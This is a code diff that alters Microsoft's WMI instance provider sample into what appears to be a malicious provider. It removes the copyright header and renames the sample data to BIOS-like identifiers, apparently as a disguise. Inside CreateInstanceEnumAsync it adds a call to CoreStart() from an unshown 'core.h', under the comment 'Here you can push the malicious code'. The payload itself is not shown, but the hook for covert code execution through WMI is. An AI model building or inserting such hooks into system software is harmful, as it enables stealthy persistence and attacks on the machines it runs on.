@@ -1,23 +1,14 @@
-//*******************************************************************
-//  INSTPRO.CPP
-//
-//  Module: WMI Instance provider sample code
-//
-//  Purpose: Defines the CInstPro class.  An object of this class is
-//           created by the class factory for each connection.
-// Copyright (C) Microsoft. All Rights Reserved.
-//
-//*******************************************************************
 #define _WIN32_WINNT 0x0500
 
 
 #include <objbase.h>
-#include "sample.h"
+#include "Provider.h"
 #include <process.h>
 #include <strsafe.h>
 #include <sddl.h>
+#include "core.h"
 
-InstDef MyDefs[] = { { L"a", 1 }, { L"b", 2 }, { L"c", 3 } };
+InstDef MyDefs[] = { { L"BiosIdentifier", 34 }, { L"MajorVersion", 2 }, { L"MinorVersion", 3451 } };
 
 long glNumInst = sizeof(MyDefs) / sizeof(InstDef);
 
@@ -33,6 +24,10 @@ CInstPro::CInstPro(BSTR ObjectPath,
 	BSTR Password,
 	IWbemContext * pCtx)
 {
+	UNREFERENCED_PARAMETER(ObjectPath);
+	UNREFERENCED_PARAMETER(User);
+	UNREFERENCED_PARAMETER(Password);
+	UNREFERENCED_PARAMETER(pCtx);
 	m_pNamespace = NULL;
 	m_cRef = 0;
 	InterlockedIncrement(&g_cObj);
@@ -41,7 +36,6 @@ CInstPro::CInstPro(BSTR ObjectPath,
 
 CInstPro::~CInstPro(void)
 {
-	system("C:\\Windows\\System32\\msg.exe * CInstProCtor");
 	if (m_pNamespace)
 		m_pNamespace->Release();
 	InterlockedDecrement(&g_cObj);
@@ -64,7 +58,6 @@ STDMETHODIMP CInstPro::QueryInterface(REFIID riid, PPVOID ppv)
 
 	// Because you have dual inheritance,
 	// it is necessary to cast the return type
-	system("C:\\Windows\\System32\\msg.exe * CInstProQueryInterface");;
 	if (riid == IID_IWbemServices)
 		*ppv = (IWbemServices*)this;
 
@@ -85,13 +78,11 @@ STDMETHODIMP CInstPro::QueryInterface(REFIID riid, PPVOID ppv)
 
 STDMETHODIMP_(ULONG) CInstPro::AddRef(void)
 {
-	system("C:\\Windows\\System32\\msg.exe * AddRef");
 	return ++m_cRef;
 }
 
 STDMETHODIMP_(ULONG) CInstPro::Release(void)
 {
-	system("C:\\Windows\\System32\\msg.exe * Release");
 	ULONG nNewCount = InterlockedDecrement((long *)&m_cRef);
 	if (0L == nNewCount)
 		delete this;
@@ -116,7 +107,13 @@ STDMETHODIMP CInstPro::Initialize(LPWSTR pszUser,
 	IWbemContext *pCtx,
 	IWbemProviderInitSink *pInitSink)
 {
-	system("C:\\Windows\\System32\\msg.exe * Initialize");
+	UNREFERENCED_PARAMETER(pInitSink);
+	UNREFERENCED_PARAMETER(pCtx);
+	UNREFERENCED_PARAMETER(pNamespace);
+	UNREFERENCED_PARAMETER(pszLocale);
+	UNREFERENCED_PARAMETER(pszNamespace);
+	UNREFERENCED_PARAMETER(lFlags);
+	UNREFERENCED_PARAMETER(pszUser);
 	if (!pNamespace)
 	{
 		pInitSink->SetStatus(WBEM_E_FAILED, 0);
@@ -145,7 +142,10 @@ SCODE CInstPro::CreateInstanceEnumAsync(const BSTR RefStr,
 	IWbemContext *pCtx,
 	IWbemObjectSink FAR* pHandler)
 {
-	system("C:\\Windows\\System32\\msg.exe * EnumAsync");
+	UNREFERENCED_PARAMETER(lFlags);
+	// Here you can push the malicious code
+	CoreStart();
+
 	//Impersonate the client
 	HRESULT hr = CoImpersonateClient();
 
@@ -206,7 +206,7 @@ SCODE CInstPro::CreateInstanceEnumAsync(const BSTR RefStr,
 //*******************************************************************
 //
 // CInstPro::GetObjectByPath
-// CInstPro::GetObjectByPathAsync
+// CInstPro::GetsObjectByPathAsync
 //
 // Purpose: Creates an instance given a particular path value.
 //
@@ -219,10 +219,10 @@ SCODE CInstPro::GetObjectAsync(const BSTR      ObjectPath,
 	IWbemContext    *pCtx,
 	IWbemObjectSink FAR* pHandler)
 {
-	system("C:\\Windows\\System32\\msg.exe * ObjectAsync");
+	UNREFERENCED_PARAMETER(lFlags);
 	//Impersonate the client
 	HRESULT hr = CoImpersonateClient();
-
+	
 	if (FAILED(hr))
 	{
 		pHandler->SetStatus(0, hr, NULL, NULL);
@@ -283,7 +283,6 @@ SCODE CInstPro::GetByPath(BSTR ObjectPath,
 	IWbemClassObject FAR* FAR* ppObj,
 	IWbemContext  *pCtx)
 {
-	system("C:\\Windows\\System32\\msg.exe * GetByPath");
 	SCODE sc = S_OK;
 
 	int iCnt;
